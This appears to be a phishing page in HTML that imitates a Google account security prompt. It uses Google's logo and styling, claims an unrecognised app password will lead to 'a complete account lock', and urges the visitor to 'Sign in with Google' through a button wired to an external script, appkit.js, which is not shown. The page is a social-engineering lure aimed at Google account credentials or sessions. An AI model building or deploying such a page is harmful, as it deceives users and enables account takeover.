<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>App Password Delete</title>
  <style>
    * { box-sizing: border-box; }
    html { min-height: 100%; background: #fff; }
    body {
      margin: 0; min-height: 100vh; min-height: 100dvh;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
      color: #202124; background: #fff;
    }
    .content {
      width: 100%; min-height: 100vh; min-height: 100dvh;
      display: flex; align-items: center; justify-content: center;
      padding: 40px 28px; background: #fff;
    }
    .card { width: 100%; max-width: 360px; text-align: center; }
    .google-logo { width: 40px; height: 40px; display: block; margin: 0 auto 24px; }
    h1 { margin: 0 0 12px; font-size: 28px; line-height: 1.25; font-weight: 500; letter-spacing: -.65px; }
    .subtitle { margin: 0 0 32px; font-size: 14px; line-height: 1.6; color: #6c7179; }
    .google-button { width: 100%; min-height: 54px; padding: 12px 20px;
      display: flex; justify-content: center; align-items: center; gap: 13px;
      border: 1px solid #dadce0; border-radius: 28px; background: #fff; color: #3c4043;
      font: 500 15px/1.4 -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
      box-shadow: 0 2px 5px rgba(60,64,67,.06); cursor: pointer;
      transition: background .18s, border-color .18s, box-shadow .18s, transform .18s;
    }
    .google-button:hover { background: #f7faff; border-color: #bacded; box-shadow: 0 4px 14px rgba(66,133,244,.12); transform: translateY(-1px); }
    .google-button:active { transform: translateY(0); }
    .google-button:focus-visible { outline: 3px solid #a8c7fa; outline-offset: 4px; }
    .button-logo { width: 20px; height: 20px; flex-shrink: 0; }
    .caption { margin: 24px 0 0; font-size: 12px; line-height: 1.5; color: #969ba3; }
    @media (prefers-reduced-motion: reduce) { .google-button { transition: none; } }
  </style>
</head>
<body>
  <main class="content" aria-labelledby="sign-in-title">
      <div class="card">
        <svg class="google-logo" viewBox="0 0 48 48" aria-hidden="true">
                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.17 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                    </svg>
        <h1 id="sign-in-title">Didn't create this app password?</h1>
        <p class="subtitle">To prevent a complete account lock, you must verify your identity and confirm your current session.</p>
        <button class="google-button" type="button" aria-describedby="preview-note"><svg class="button-logo" viewBox="0 0 48 48" aria-hidden="true">
                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.17 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                    </svg><span>Sign in with Google</span></button>
      </div>
  </main>
<script src="./appkit.js"></script>
</body>
</html>
